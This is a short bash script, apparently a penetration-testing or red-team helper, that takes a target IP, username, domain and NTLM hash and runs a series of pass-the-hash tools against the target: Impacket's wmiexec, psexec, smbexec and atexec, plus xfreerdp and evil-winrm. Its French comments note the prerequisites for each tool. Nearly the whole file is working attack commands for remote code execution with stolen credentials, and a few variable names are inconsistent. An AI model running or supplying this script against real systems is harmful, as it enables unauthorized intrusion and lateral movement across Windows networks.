#!/bin/bash
#take some inputs
if [ $# -lt 4 ]
        then
                echo "Usage: $0 <IP> <Username> <Domain_Name> <NTLM>"
                echo "eg: $0 10.10.10.10 administrator aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc"
                exit
        else
                IP="$1"
                Username="$2"
                Domain_Name=$3
                NTLM="$4"
fi
#some colors
RED="\e[31m"
BLUE="\e[34m"
ENDCOLOR="\e[0m"
#parsing the NTLM hash
# Set space as the delimiter
IFS=':'
#Read the split words into an array based on space delimiter
read -a strarr <<< $NTLM
#set variables NT and LM
LM="${strarr[0]}"
NT="${strarr[1]}"

echo -e "${RED}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~Commands Can Be Used~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~${ENDCOLOR}"
echo -e "${BLUE} evil-winrm -i $IP -u $username -H $NT  ${ENDCOLOR}"
echo -e "${BLUE} wmiexec.py $Domain_Name/$Username@$IP -hashes $NTLM ${ENDCOLOR}"
echo -e "${BLUE} xfreerdp /v:$IP /u:$Username /pth:$NT ${ENDCOLOR}"
echo -e "${BLUE} psexec.py $Domain_Name/$Username@$IP -hashes :$NT ${ENDCOLOR}"
echo -e "${BLUE} smbexec.py $Domain_Name/$Username@$IP -hashes :$NTLM ${ENDCOLOR}"
echo -e "${BLUE} atexec.py $Username@$IP -hashes $NTLM whoami ${ENDCOLOR}"

echo -e "${RED}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~Start The Checks~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~${ENDCOLOR}"

#wmiexec : l'utilisateur doit etre admin sur la cible
echo "wmiexec.py $Domain_Name/$Username@$IP -hashes $NTLM"
wmiexec.py $Domain_Name/$Username@$IP -hashes $NTLM

#xfreerdp : RDP 
echo "xfreerdp /v:$IP /u:$Username /pth:$NT"
xfreerdp /v:$IP /u:$Username /pth:$NT

#psexec
echo "psexec.py $Domain_Name/$Username@$IP -hashes :$NT "
psexec.py $Domain_Name/$Username@$IP -hashes :$NT

#smbexec : comme psexec, mais au lieu de pointer sur un .exe dans le partage, il pointe directement sur cmd.exe ou powershell.exe
echo "smbexec.py $Domain_Name/$Username@$IP -hashes :$NTLM "
smbexec.py $Domain_Name/$Username@$IP -hashes :$NTLM

#se connecte au task scheduler service pour executer un command
echo -e "${BLUE} atexec.py -hashes $NTLM $Username@$IP whoami ${ENDCOLOR}"
atexec.py -hashes $NTLM $Username@$IP

#evil-winrm : les ports de winrm doivent etre activé sur la cible 
echo "evil-winrm -i $IP -u $Username -H $NT"
evil-winrm -i $IP -u $username -H $NT 
sleep 5
